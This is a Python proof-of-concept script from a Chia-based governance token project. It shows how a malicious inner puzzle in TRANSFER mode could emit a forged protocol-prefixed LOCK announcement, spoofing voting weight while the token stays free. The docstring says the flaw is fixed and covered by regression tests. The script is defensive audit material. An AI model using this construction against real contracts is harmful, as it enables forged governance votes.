"""PoC: PGT TRANSFER mode can spoof a governance LOCK announcement.

Audit reference: ``research/CANON_CHIA_PROJECT_AUDIT_2026_04_26.md`` (POP-CANON-001).

Run:
    PYTHONPATH=. .venv/bin/python tests/poc_pgt_lock_announcement_spoof.py

Pre-fix vulnerable output:
    forged_lock_announcement_present=True
    create_coin_count=1
    STATUS: VULNERABLE — attack succeeded (PGT remained free; tracker would
            accept the forged LOCK announcement as voting weight).

Post-fix output (current):
    STATUS: FIXED — attack rejected by check_no_protocol_prefix_abuse.
    The PGT wrapper now forbids inner puzzles from emitting any
    CREATE_PUZZLE_ANNOUNCEMENT or CREATE_COIN_ANNOUNCEMENT.

Regression tests covering the fix:
    ``tests/test_pop_canon_001.py`` (7 tests pinning all attack variants
    plus the legitimate-LOCK happy path).
"""
from __future__ import annotations

from chia.types.blockchain_format.program import Program
from chia_rs.sized_bytes import bytes32

from solslot_puzzles.pgt_driver import (
    PGT_TRANSFER,
    SINGLETON_LAUNCHER_HASH,
    make_proposal_tracker_struct,
    pgt_free_inner_mod,
    pgt_free_inner_puzzle,
    pgt_locked_inner_mod,
)


CREATE_COIN = 51
CREATE_PUZZLE_ANNOUNCEMENT = 62
PROTOCOL_PREFIX = b"\x50"
LOCK_TAG = b"LOCK"


def main() -> None:
    singleton_mod_hash = bytes32(b"\x01" * 32)
    tracker_launcher_id = bytes32(b"\xb0" * 32)
    tracker_struct = make_proposal_tracker_struct(
        singleton_mod_hash,
        tracker_launcher_id,
        SINGLETON_LAUNCHER_HASH,
    )

    pgt_locked_mod_hash = bytes32(pgt_locked_inner_mod().get_tree_hash())
    pgt_free_mod_hash = bytes32(pgt_free_inner_mod().get_tree_hash())

    proposal_hash = bytes32(b"\xee" * 32)
    amount = 600_000
    deadline = 2_000_000_000

    owner_inner = Program.to((1, []))
    owner_hash = bytes32(owner_inner.get_tree_hash())
    lock_content = PROTOCOL_PREFIX + Program.to(
        [LOCK_TAG, proposal_hash, amount, deadline]
    ).get_tree_hash()

    # The malicious owner inner emits exactly one CREATE_COIN, so TRANSFER mode
    # passes, plus a protocol-prefixed LOCK announcement. The current
    # check_no_protocol_prefix_abuse() filter does not reject puzzle
    # announcements.
    malicious_inner = Program.to(
        (
            1,
            [
                [CREATE_COIN, owner_hash, amount],
                [CREATE_PUZZLE_ANNOUNCEMENT, lock_content],
            ],
        )
    )

    pgt_free = pgt_free_inner_puzzle(
        pgt_locked_mod_hash,
        tracker_struct,
        bytes32(malicious_inner.get_tree_hash()),
    )

    print("PGT LOCK announcement spoof PoC")
    print("-" * 72)
    print(f"pgt_free_mod_hash={pgt_free_mod_hash.hex()}")
    print(f"proposal_hash={proposal_hash.hex()}")
    print(f"lock_content={lock_content.hex()}")
    print()

    try:
        out = pgt_free.run(
            Program.to([PGT_TRANSFER, malicious_inner, 0, 0])
        ).as_python()
    except Exception as e:
        # Post-fix: the filter raises (x).  Attack rejected.
        print("STATUS: FIXED — attack rejected by check_no_protocol_prefix_abuse.")
        print(f"        CLVM error: {type(e).__name__}: {e}")
        print()
        print("Regression tests: tests/test_pop_canon_001.py")
        return

    # Pre-fix path: the run succeeded, attack went through.
    forged_lock = any(
        c[0] == bytes([CREATE_PUZZLE_ANNOUNCEMENT]) and c[1] == lock_content
        for c in out
    )
    create_coin_count = sum(1 for c in out if c[0] == bytes([CREATE_COIN]))

    print(f"forged_lock_announcement_present={forged_lock}")
    print(f"create_coin_count={create_coin_count}")
    print()
    if forged_lock and create_coin_count == 1:
        print("STATUS: VULNERABLE — attack succeeded (PGT remained free).")
    print()
    print("Emitted conditions:")
    for condition in out:
        print(condition)


if __name__ == "__main__":
    main()
